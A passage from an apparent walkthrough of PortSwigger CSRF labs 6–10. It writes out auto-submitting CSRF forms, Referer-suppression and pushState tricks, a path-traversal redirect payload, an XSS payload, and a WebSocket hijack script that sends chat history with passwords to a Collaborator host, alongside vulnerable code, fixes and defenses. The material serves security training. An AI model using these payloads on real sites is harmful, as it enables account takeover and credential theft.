- **URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates a critical logic flaw where CSRF validation only occurs when a token is present:

```python
if csrf_token_present:
    validate_token()
else:
    pass  # No validation - BUG!
```

**The flaw**: Attackers simply omit the CSRF parameter entirely, bypassing all validation.

**Common mistake**: Developers write validation logic but forget to enforce token presence, assuming it will be required elsewhere.

### Step-by-Step Solution

#### Step 1: Initial Analysis

1. Log in with `wiener:peter`
2. Navigate to email change functionality
3. Submit form and capture:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=VALID-TOKEN-HERE
```

#### Step 2: Test Token Validation

1. Send to Repeater
2. **Test 1**: Modify `csrf` to invalid value:

```http
email=test@example.com&csrf=INVALID
```

Result: Rejected with "Invalid CSRF token"

3. **Test 2**: Remove `csrf` parameter entirely:

```http
email=test@example.com
```

Result: **Request succeeds!** Email changes.

**Vulnerability confirmed**: Validation only occurs when token is present.

#### Step 3: Create CSRF Exploit Without Token

```html
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
      <!-- No CSRF token parameter at all -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Key point**: No `<input name="csrf">` field in the form.

#### Step 4: Deploy and Deliver

1. Paste into exploit server Body
2. Store and test with "View exploit"
3. Update email to unique value
4. Deliver exploit to victim

### HTTP Requests and Responses

**Request with Valid Token (Works):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=N7pK9mL3vX2wY5tZ8Hj4D
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

email=valid@example.com&csrf=AbCd123EfGh456IjKl789MnOp

Response:
HTTP/1.1 302 Found
Location: /my-account
```

**Request with Invalid Token (Fails):**
```http
POST /my-account/change-email HTTP/1.1
Content-Length: 35

email=test@example.com&csrf=WRONG

Response:
HTTP/1.1 400 Bad Request
Invalid CSRF token
```

**Request with No Token (Works - Vulnerability!):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=N7pK9mL3vX2wY5tZ8Hj4D
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=pwned@attacker.com

Response:
HTTP/1.1 302 Found
Location: /my-account
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Capture legitimate requests
2. **Repeater**: Test parameter removal
3. **Parameter Deletion**: Right-click parameter → "Delete parameter"
4. **CSRF PoC Generator**: Generate exploit after removing parameter
5. **Content-Length auto-update**: Burp automatically adjusts after parameter deletion

### Common Mistakes

1. **Leaving empty parameter**: Using `csrf=` instead of removing completely
2. **Sending null/undefined**: Using `csrf=null` instead of omitting
3. **Email conflicts**: Using duplicate addresses
4. **Testing confusion**: Assuming invalid token = no token behavior
5. **HTML error**: Leaving empty input field `<input name="csrf" value="">` instead of removing entirely

### Troubleshooting Tips

- **Still getting "Invalid CSRF token"**: Parameter may be present but empty vs. completely absent
- **Request format issues**: Ensure Content-Length matches actual body
- **Parameter still in request**: Use "Delete parameter" in Repeater, don't just clear value
- **Form behavior**: Verify HTML has no csrf input field at all
- **Browser cache**: Clear cache if testing repeatedly

### Vulnerable Code Example

```python
# Vulnerable: Conditional validation
@app.route('/change-email', methods=['POST'])
def change_email():
    csrf_token = request.form.get('csrf')

    # BUG: Only validates if token is present
    if csrf_token:
        if not validate_csrf(csrf_token, session):
            return "Invalid CSRF token", 400
    # If no token, validation is skipped!

    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Secure Implementation

```python
# Secure: Always require and validate token
@app.route('/change-email', methods=['POST'])
def change_email():
    csrf_token = request.form.get('csrf')

    # Fail if token is missing
    if not csrf_token:
        return "CSRF token required", 400

    # Validate the token
    if not validate_csrf(csrf_token, session):
        return "Invalid CSRF token", 400

    # Only execute if validation passed
    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Defense Recommendations

1. **Always require tokens**: Reject requests missing CSRF tokens entirely
2. **Fail securely**: Default to rejecting requests, not allowing them
3. **Use framework protections**: Most frameworks enforce token presence by default
4. **Test negative cases**: Always test missing parameters, not just invalid ones
5. **Code review**: Look for conditional validation that might skip checks

### Key Takeaways

1. **Validation logic must be mandatory**: Security checks should fail closed
2. **Presence and validity are different**: Both must be checked
3. **This is common**: Many developers make this mistake
4. **Simple bypass, severe impact**: Easiest CSRF bypass but equally dangerous
5. **Testing methodology**: Always test with missing parameters, not just invalid ones
6. **Framework misuse**: Often occurs when implementing custom validation instead of using frameworks

---

## Lab 7: CSRF Where Referer Validation Depends on Header Being Present

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates flawed Referer-based CSRF defense. The application:
- Uses HTTP Referer header to validate request origin
- Checks if Referer contains expected domain
- **BUT** only performs validation when Referer header is present

**The bypass**: Suppress the Referer header using HTML meta tags, and no validation occurs.

### Step-by-Step Solution

#### Step 1: Analyze Referer Validation

1. Log in with `wiener:peter`
2. Submit email change and capture:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

#### Step 2: Test Referer Validation

1. Send to Repeater
2. **Test 1**: Modify Referer to different domain:

```http
Referer: https://evil-attacker.com
```

Result: Request rejected ("Invalid Referer")

3. **Test 2**: Delete Referer header entirely:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

Result: **Request succeeds!**

**Vulnerability confirmed**: Validation only when Referer present.

#### Step 3: Create Exploit with Referer Suppression

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Key element**: `<meta name="referrer" content="no-referrer">` instructs browser not to send Referer header.

#### Step 4: Deploy and Deliver

1. Paste into exploit server Body
2. Store and test with "View exploit"
3. Update email to unique value
4. Deliver exploit to victim

### HTTP Requests and Responses

**Legitimate Request with Referer (Works):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=K9mL3vP7wX2nR5tY8Zs4Hj
Referer: https://0a7d003c04e817d180e4e8a100e500a6.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded

email=legitimate@example.com

Response:
HTTP/1.1 302 Found
Location: /my-account
```

**Wrong Referer (Fails):**
```http
Referer: https://evil-attacker.com

Response:
HTTP/1.1 403 Forbidden
Invalid Referer
```

**No Referer (Works - Vulnerability!):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=K9mL3vP7wX2nR5tY8Zs4Hj
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com

Response:
HTTP/1.1 302 Found
Location: /my-account
```

### Referrer Policy Options

```html
<!-- Prevent Referer entirely (used in this lab) -->
<meta name="referrer" content="no-referrer">

<!-- Other options -->
<meta name="referrer" content="no-referrer-when-downgrade"> <!-- HTTPS→HTTP only -->
<meta name="referrer" content="origin"> <!-- Origin only, not full URL -->
<meta name="referrer" content="origin-when-cross-origin">
<meta name="referrer" content="same-origin"> <!-- Only for same-origin requests -->
<meta name="referrer" content="strict-origin">
<meta name="referrer" content="unsafe-url"> <!-- Always send full URL -->
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Observe Referer headers
2. **Repeater**: Test Referer validation and removal
3. **Request Headers**: Delete or modify headers manually
4. **CSRF PoC Generator**: Generate base exploit
5. **Exploit Server**: Host payload with custom HTML

### Common Mistakes

1. **Wrong meta tag syntax**: Misspelling `referrer` or attributes
2. **Meta tag placement**: Placing in body instead of head section
3. **Testing only in Repeater**: Manual removal works, but browser behavior differs
4. **Email conflicts**: Using duplicate addresses
5. **Browser caching**: Old pages cached with wrong meta tags

### Troubleshooting Tips

- **Referer still being sent**: Clear browser cache, verify meta tag in `<head>`
- **Validation still failing**: Check exact meta tag syntax
- **Works in Repeater but not browser**: Browser Referrer-Policy defaults differ
- **Mixed results**: Browser support for referrer policies varies
- **Developer tools**: Use Network tab to verify Referer is actually absent

### Vulnerable Code Example

```python
# Vulnerable: Optional Referer check
@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer')

    # BUG: Only validates if Referer is present
    if referer:
        expected_domain = 'legitimate-site.com'
        if expected_domain not in referer:
            return "Invalid Referer", 403
    # If no Referer, validation skipped!

    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Secure Implementation

```python
# Secure: Always require Referer
@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer')

    # Require Referer to be present
    if not referer:
        return "Referer required", 403

    # Validate it properly
    if not validate_referer(referer, expected_domain):
        return "Invalid Referer", 403

    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

**Even better**: Don't rely on Referer alone—use CSRF tokens as primary defense.

### Defense Recommendations

1. **Referer validation is weak**: Headers can be suppressed for privacy
2. **Always require Referer** if using it for validation
3. **Use CSRF tokens as primary defense**: Referer should be supplementary
4. **Implement SameSite cookies**: Additional layer of protection
5. **Framework CSRF protection**: Use built-in mechanisms

### Key Takeaways

1. **Referer validation is insufficient**: Can be suppressed by users/attackers
2. **Presence checks matter**: Validate both presence and value
3. **Privacy features break security**: Browser privacy allows Referer suppression
4. **Defense-in-depth**: Referer should supplement, not replace CSRF tokens
5. **Browser behavior varies**: Different browsers handle Referrer-Policy differently
6. **Meta tags are powerful**: HTML can control browser security behavior
7. **Common pattern**: Similar to Lab 6—conditional validation is dangerous

---

## Lab 8: CSRF with Broken Referer Validation

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates weak Referer validation logic. The application:
- Requires Referer header to be present
- Checks if expected domain appears **anywhere** in Referer
- Performs simple substring match, not origin validation

**The bypass**: Place legitimate domain in query string of malicious URL.

Example:
- Legitimate: `Referer: https://legitimate-site.com/page`
- Bypass: `Referer: https://attacker.com/?legitimate-site.com`

### Step-by-Step Solution

#### Step 1: Initial Testing

1. Log in with `wiener:peter`
2. Submit email change and capture:

```http
POST /my-account/change-email HTTP/1.1
Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

#### Step 2: Test Referer Validation

1. Send to Repeater
2. **Test 1**: Remove Referer → Fails (requires Referer)
3. **Test 2**: Change domain completely:

```http
Referer: https://evil-attacker.com
```

Result: Rejected

4. **Test 3**: Add legitimate domain as query parameter:

```http
Referer: https://evil-attacker.com?YOUR-LAB-ID.web-security-academy.net
```

Result: **Succeeds!** Substring match bypassed.

**Vulnerability confirmed**: Server checks if domain string exists anywhere in Referer.

#### Step 3: Understand Browser Referer Stripping

Modern browsers strip query strings from Referer for privacy. To work around this:
1. Use JavaScript to manipulate current URL
2. Override browser's Referrer-Policy

#### Step 4: Create Exploit with URL Manipulation

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
    </form>
    <script>
      history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**How it works**:
1. `history.pushState()` changes browser's current URL without reload
2. New URL includes legitimate domain as query parameter
3. Form submission sends Referer with modified URL
4. `unsafe-url` policy ensures full URL (with query string) is sent

#### Step 5: Alternative—Set Referrer-Policy on Exploit Server

In exploit server "Head" section:
```
Referrer-Policy: unsafe-url
```

#### Step 6: Deploy and Deliver

1. Paste HTML into exploit server Body
2. Add `Referrer-Policy: unsafe-url` to Head section
3. Store and test with "View exploit"
4. Update email to unique value
5. Deliver exploit to victim

### HTTP Requests and Responses

**Legitimate Request:**
```http
POST /my-account/change-email HTTP/1.1
Referer: https://0a8b007604c317c08036b0ad00e800a2.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded

email=user@example.com

Response:
HTTP/1.1 302 Found
```

**Wrong Referer (Fails):**
```http
Referer: https://evil-attacker.com

Response:
HTTP/1.1 403 Forbidden
Invalid Referer
```

**Bypassed with Query String (Works):**
```http
POST /my-account/change-email HTTP/1.1
Referer: https://exploit-SERVER-ID.exploit-server.net/?0a8b007604c317c08036b0ad00e800a2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com

Response:
HTTP/1.1 302 Found
```

### Referrer Policy Comparison

| Policy | Query String Included | Suitable for Lab |
|--------|----------------------|------------------|
| `no-referrer` | No Referer sent | No |
| `origin` | Only origin | No |
| `strict-origin` | Only origin | No |
| `no-referrer-when-downgrade` | Yes (HTTPS→HTTPS) | Maybe |
| `origin-when-cross-origin` | No for cross-origin | No |
| `unsafe-url` | **Yes - Full URL always** | **Yes** |

### Burp Suite Features Used

1. **Proxy > HTTP History**: Analyze Referer headers
2. **Repeater**: Test Referer manipulation
3. **Request Header Editing**: Manually modify Referer
4. **Exploit Server**: Host payload and set custom headers
5. **Browser Integration**: Test actual browser Referer behavior

### Common Mistakes

1. **Missing Referrer-Policy**: Forgetting `unsafe-url`, causing query string stripping
2. **Wrong meta tag**: Using `no-referrer` instead of `unsafe-url`
3. **Typo in domain**: Misspelling lab domain in query parameter
4. **URL encoding issues**: Not handling special characters properly
5. **Email conflicts**: Using duplicate addresses
6. **Testing only in Repeater**: Manual editing works but doesn't reflect browser behavior

### Troubleshooting Tips

- **Query string not in Referer**: Ensure `Referrer-Policy: unsafe-url` is set
- **Still getting "Invalid Referer"**: Check spelling of domain in query
- **Works in Repeater but not browser**: Verify `history.pushState()` executes before submission
- **Browser console errors**: Check for JavaScript errors
- **Lab doesn't solve**: Confirm victim's email actually changed

### Vulnerable Code Example

```python
# Vulnerable: Substring match
@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer', '')
    expected_domain = 'YOUR-LAB-ID.web-security-academy.net'

    # BUG: Substring match instead of origin validation
    if expected_domain not in referer:
        return "Invalid Referer", 403

    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Secure Implementation

```python
from urllib.parse import urlparse

@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer', '')
    if not referer:
        return "Referer required", 403

    # Parse and validate actual origin
    parsed = urlparse(referer)
    expected_domain = 'YOUR-LAB-ID.web-security-academy.net'

    if parsed.hostname != expected_domain:
        return "Invalid Referer", 403

    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

**Even better**: Use CSRF tokens, not Referer validation.

### Defense Recommendations

1. **Never use substring matching**: Parse and validate actual origin
2. **Don't rely solely on Referer**: Use CSRF tokens as primary defense
3. **Understand Referrer-Policy**: Attackers can control this
4. **Use framework protections**: Built-in CSRF defenses are better
5. **Defense in depth**: Combine tokens + SameSite + origin validation

### Key Takeaways

1. **Substring matching is dangerous**: String operations don't validate origins properly
2. **Referer is attacker-controllable**: Via URL manipulation and policy headers
3. **Browser privacy can be overridden**: `unsafe-url` bypasses privacy protections
4. **URL structure matters**: Query parameters are part of URL but not origin
5. **Proper parsing essential**: Use language URL parsing, not string operations
6. **Common vulnerability**: Many custom implementations make this mistake
7. **Testing methodology**: Test domain in various positions (path, query, fragment)

---

## Lab 9: SameSite Strict Bypass via Client-Side Redirect

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
- **Credentials:** wiener:peter

### Vulnerability Description

Advanced CSRF attack bypassing SameSite=Strict protection. The vulnerability chain:

1. **SameSite=Strict**: Session cookies have `SameSite=Strict`, preventing cross-site requests
2. **No CSRF Tokens**: Email change endpoint lacks token validation
3. **Client-Side Redirect Gadget**: JavaScript redirect using user-controlled input
4. **Path Traversal**: Redirect can navigate to arbitrary same-site endpoints

**Attack works because**:
- SameSite=Strict prevents cross-site cookies
- BUT allows same-site cookies
- Redirect gadget makes request originate from same site
- Browser treats it as legitimate same-site navigation

### Step-by-Step Solution

#### Step 1: Identify the Vulnerability

1. Log in with `wiener:peter`
2. Change email and observe:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

3. Check cookie attributes:

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

#### Step 2: Discover the Redirect Gadget

1. Post a comment on any blog post
2. After submission, observe redirect:

```
/post/comment/confirmation?postId=3
```

3. Check JavaScript (view source or Burp):

```javascript
// In /resources/js/commentConfirmationRedirect.js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

4. JavaScript constructs path using `postId` parameter

#### Step 3: Test Path Traversal

1. Visit:

```
/post/comment/confirmation?postId=1
```

Redirects to `/post/1`

2. Try path traversal:

```
/post/comment/confirmation?postId=1/../../my-account
```

After 3 seconds, redirects to `/my-account`

**Gadget confirmed**: Can navigate to arbitrary same-site endpoints!

#### Step 4: Determine GET-Based Email Change

1. Find email change POST request in Burp
2. Send to Repeater
3. Right-click → "Change request method"
4. Request becomes GET:

```http
GET /my-account/change-email?email=test@example.com HTTP/1.1
```

5. Send → **It works!**

#### Step 5: Craft Complete Exploit

```html
<html>
  <body>
    <script>
      document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
    </script>
  </body>
</html>
```

**Critical details**:
- URL-encode ampersand: `%26` (not `&`)
  - Keeps `submit=1` as part of `postId` parameter
  - Without encoding, it's separate parameter to confirmation endpoint
- Include `submit=1` if endpoint requires it
- Victim navigates to confirmation page (same-site)
- JavaScript redirects to email change (still same-site)
- Session cookies included (same-site navigation)

#### Step 6: Deploy and Deliver

1. Paste into exploit server Body
2. Store and test with "View exploit" (wait 3 seconds)
3. Update email to unique value
4. Deliver exploit to victim

### HTTP Requests and Responses

**Initial Comment Confirmation:**
```http
GET /post/comment/confirmation?postId=3 HTTP/1.1
Cookie: session=abc123xyz

Response:
HTTP/1.1 200 OK
<script src="/resources/js/commentConfirmationRedirect.js"></script>
<p>Thank you for submitting your comment!</p>
```

**Malicious Redirect:**
```http
GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@attacker.com%26submit=1 HTTP/1.1
Cookie: session=abc123xyz

Response: (JavaScript executes after 3 seconds)
// Redirects to: /post/1/../../my-account/change-email?email=pwned@attacker.com&submit=1
```

**Final Same-Site Email Change:**
```http
GET /my-account/change-email?email=pwned@attacker.com&submit=1 HTTP/1.1
Cookie: session=abc123xyz
Referer: https://LAB-ID.web-security-academy.net/post/comment/confirmation

Response:
HTTP/1.1 302 Found
```

### Path Traversal Mechanics

```javascript
blogPath = '/post'
postId = '1/../../my-account/change-email?email=pwned@attacker.com%26submit=1'

// JavaScript constructs:
final_path = blogPath + '/' + postId
// Result: '/post/1/../../my-account/change-email?email=pwned@attacker.com&submit=1'

// Browser normalizes:
// /post/1/../../ → /post/1/../ → /post/ → /
// Final: /my-account/change-email?email=pwned@attacker.com&submit=1
```

### URL Encoding Requirements

| Character | Unencoded | Encoded | Reason |
|-----------|-----------|---------|--------|
| `&` | `&` | `%26` | Keep as part of postId |
| `@` | `@` | `%40` | Special in URLs |
| `?` | `?` | Keep | Query string start |
| `/` | `/` | Keep | Path traversal |

### Burp Suite Features Used

1. **Proxy > HTTP History**: Identify redirect behavior and cookies
2. **JavaScript Analysis**: Find client-side redirect code
3. **Repeater**: Test path traversal and method conversion
4. **Change Request Method**: Convert POST to GET
5. **Decoder**: URL-encode special characters
6. **Exploit Server**: Host and deliver attack

### Common Mistakes

1. **Not URL-encoding ampersand**: Using `&` breaks path traversal
2. **Missing submit parameter**: Some endpoints require `submit=1`
3. **Email conflicts**: Using duplicate addresses
4. **Testing too quickly**: Not waiting 3-second redirect delay
5. **Incorrect path traversal depth**: Wrong number of `../`
6. **Wrong method**: Using POST instead of GET
7. **Cross-origin attempt**: Attacking directly instead of via same-site redirect

### Troubleshooting Tips

- **Redirect not happening**: Wait full 3 seconds; check JavaScript console
- **Path traversal fails**: Count directory depth correctly
- **Parameters not working**: Verify ampersand URL encoding (`%26`)
- **Cookies not included**: Ensure redirect originates from same site
- **Lab doesn't solve**: Confirm email actually changed
- **404 errors**: Check path construction

### Defense Recommendations

**Fix the Redirect Gadget:**
```javascript
// Vulnerable:
const postId = url.searchParams.get("postId");
window.location = blogPath + '/' + postId;

// Secure:
const postId = url.searchParams.get("postId");
if (!/^\d+$/.test(postId)) {  // Only allow digits
    throw new Error("Invalid postId");
}
window.location = blogPath + '/' + postId;
```

**Add CSRF Tokens:**
```python
@csrf_required
def change_email(request):
    validate_csrf_token(request)
    # Process email change
```

**Restrict HTTP Methods:**
```python
@require_http_methods(["POST"])
def change_email(request):
    # Only accept POST
```

### Key Takeaways

1. **SameSite=Strict isn't foolproof**: Bypassed via same-site gadgets
2. **Client-side redirects are dangerous**: Dynamic URL construction is risky
3. **Path traversal matters**: Even in URL paths, not just file systems
4. **Defense in depth critical**: SameSite + CSRF tokens + method restrictions
5. **GET should be safe**: State-changing operations should use POST
6. **URL encoding affects exploitation**: Understanding encoding is crucial
7. **Attack chains are powerful**: Multiple weaknesses create exploits
8. **Browser security models are complex**: Same-site vs. cross-site nuances

---

## Lab 10: SameSite Strict Bypass via Sibling Domain

### Lab Information
- **Difficulty Level:** Expert
- **URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
- **Credentials:** wiener:peter

### Vulnerability Description

The most complex CSRF lab, combining multiple vulnerabilities:

1. **Cross-Site WebSocket Hijacking (CSWSH)**: Live chat uses WebSockets without CSRF protection
2. **SameSite=Strict**: Session cookies use SameSite=Strict
3. **Sibling Domain XSS**: CMS subdomain has reflected XSS
4. **Same-Site Definition**: Sibling subdomains share same "site" for cookies

**Attack chain**:
- Exploit XSS on `cms-[LAB-ID].web-security-academy.net`
- From there, attack WebSocket on `[LAB-ID].web-security-academy.net`
- Both share parent domain, so they're "same-site"
- Session cookies included despite SameSite=Strict

### Step-by-Step Solution

#### Step 1: Analyze WebSocket Chat Feature

1. Log in with `wiener:peter`
2. Click "Live chat"
3. Enable WebSocket history in Burp: Proxy > Options > Intercept WebSocket messages
4. Observe handshake:

```http
GET /chat HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Upgrade: websocket
Connection: Upgrade
```

5. No CSRF tokens or unpredictable values
6. Send message and observe:

```
Client → Server: READY
Server → Client: [Chat history with usernames and passwords]
```

#### Step 2: Test WebSocket Hijacking

Basic CSWSH proof of concept:

```javascript
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
</script>
```

Test → **No Collaborator interactions** (SameSite=Strict blocks cross-site cookies)

#### Step 3: Discover Sibling Domain

1. Check HTTP responses for domain references
2. Find reference to `cms-[LAB-ID].web-security-academy.net`
3. Navigate to this subdomain
4. Observe CMS login form

#### Step 4: Find XSS Vulnerability

1. Test CMS login with XSS payloads
2. Try username field:

```html
<script>alert(1)</script>
```

3. Alert fires → **XSS confirmed**
4. Send POST to Repeater
5. Right-click → "Change request method" to GET
6. Test GET version:

```
/login?username=<script>alert(1)</script>&password=anything
```

7. XSS works in GET requests

#### Step 5: Understand Same-Site vs Cross-Origin

**Key concept**:
- `https://lab-id.web-security-academy.net` and `https://cms-lab-id.web-security-academy.net` are **cross-origin**
- BUT **same-site** (share `web-security-academy.net` registrable domain)
- SameSite=Strict allows cookies in same-site contexts

#### Step 6: Create Combined Exploit

```html
<script>
var payload = `<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
ws.onopen = function() {
    ws.send('READY');
};
ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
<\/script>`;

document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=" + encodeURIComponent(payload) + "&password=anything";
</script>
```

#### Step 7: Deploy and Extract Credentials

1. Start Burp Collaborator client
2. Copy Collaborator URL
3. Update exploit with Collaborator URL and lab ID
4. Paste into exploit server Body
5. Store and deliver to victim
6. Poll Burp Collaborator for HTTP interactions
7. Find chat history:

```
Hi, my username is carlos and my password is SECRET_PASSWORD
```

#### Step 8: Complete the Lab

1. Log in with `carlos:SECRET_PASSWORD`
2. Lab solved

### HTTP Requests and Responses

**WebSocket Handshake:**
```http
GET /chat HTTP/1.1
Host: 0a3f00ba0448e0c081d9f4bd00ab0065.web-security-academy.net
Cookie: session=K9mL3vP7wX2nR5tY
Upgrade: websocket
Sec-WebSocket-Version: 13

Response:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
```

**WebSocket Messages:**
```
→ READY
← {"user":"carlos","content":"Hi, my username is carlos and my password is xq0u6rcj5rdyy0bmwgp3"}
← {"user":"Hal Pline","content":"Hello!"}
```

**XSS on CMS Domain:**
```http
GET /login?username=%3Cscript%3Ealert(1)%3C%2Fscript%3E&password=test HTTP/1.1
Host: cms-0a3f00ba0448e0c081d9f4bd00ab0065.web-security-academy.net

Response:
<input type="text" name="username" value="<script>alert(1)</script>">
```

**Attack from CMS Domain (Same-Site):**
```http
GET /chat HTTP/1.1
Host: 0a3f00ba0448e0c081d9f4bd00ab0065.web-security-academy.net
Cookie: session=K9mL3vP7wX2nR5tY
Origin: https://cms-0a3f00ba0448e0c081d9f4bd00ab0065.web-security-academy.net
Upgrade: websocket

Response: (WebSocket established with session cookies)
```

### Same-Site vs Cross-Origin Explanation

| Concept | Definition | Example |
|---------|-----------|---------|
| **Origin** | Protocol + Domain + Port | `https://example.com:443` |
| **Site** | Protocol + Registrable Domain | `https://example.com` |
| **Same-Origin** | Exact match | `app.example.com` ≠ `cms.example.com` |
| **Same-Site** | Same registrable domain | `app.example.com` = `cms.example.com` (same site!) |
| **Cross-Site** | Different registrable domains | `example.com` ≠ `attacker.com` |

**For this lab**:
- `lab-id.web-security-academy.net` and `cms-lab-id.web-security-academy.net` are **cross-origin**
- BUT **same-site** (both under `.web-security-academy.net`)
- SameSite=Strict cookies included in same-site requests

### Burp Suite Features Used

1. **Proxy > WebSocket History**: Monitor WebSocket messages
2. **Proxy > HTTP History**: Identify sibling domains and XSS
3. **Repeater**: Test XSS and method conversion
4. **Burp Collaborator**: Exfiltrate data out-of-band
5. **Change Request Method**: Convert POST to GET
6. **Decoder**: URL-encode complex payloads
7. **Exploit Server**: Host and deliver initial redirect

### Common Mistakes

1. **Testing from exploit server directly**: This is cross-site, not same-site
2. **Not URL-encoding payload**: Breaks query parameter injection
3. **Forgetting to poll Collaborator**: Data arrives but isn't checked
4. **Wrong WebSocket protocol**: Use `wss://` for HTTPS
5. **Not escaping closing script tag**: Use `<\/script>` in string literals
6. **Missing sibling domain**: Not exploring all subdomains

### Troubleshooting Tips

- **No Collaborator interactions**: Verify payload URL-encoding and Collaborator URL
- **WebSocket not connecting**: Check `wss://` protocol and lab ID
- **XSS not executing**: Ensure proper URL encoding
- **Cookies not included**: Confirm attack originates from same-site (CMS domain)
- **READY message not sending**: Check WebSocket `onopen` handler
- **Chat history empty**: Wait a few seconds for carlos to post
- **Can't find password**: Search Collaborator data for "password"

### Defense Recommendations

**Fix WebSocket CSRF:**
```javascript
// Client sends token
ws.send(JSON.stringify({
    action: "READY",
    csrf_token: document.querySelector('[name=csrf]').value
}));

// Server validates
function handle_websocket(message, session):
    data = json.loads(message)
    if data['csrf_token'] != session['csrf_token']:
        close_connection()
```

**Fix XSS on CMS:**
```php
// Vulnerable:
echo "<input name='username' value='" . $_GET['username'] . "'>";

// Secure:
echo "<input name='username' value='" . htmlspecialchars($_GET['username'], ENT_QUOTES) . "'>";
```

**Tighten Cookie Scope:**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Domain=0a3f00ba0448e0c081d9f4bd00ab0065.web-security-academy.net
```

Specifying exact domain prevents sibling domain sharing.

**Separate Security Boundaries:**
- Host CMS on completely different domain
- Don't share cookies across subdomains
- Implement Content-Security-Policy

### Key Takeaways

1. **Same-Site ≠ Same-Origin**: Subdomains are same-site but cross-origin
2. **XSS on subdomains is critical**: Can bypass SameSite protections
3. **WebSockets need CSRF protection**: Tokens should be validated
4. **Attack chains are powerful**: Multiple small issues = critical vulnerability
5. **Defense in depth matters**: No single defense is sufficient
6. **Scope matters**: Cookie scope determines which domains can access them
7. **Subdomain isolation**: Security boundaries should be at domain level
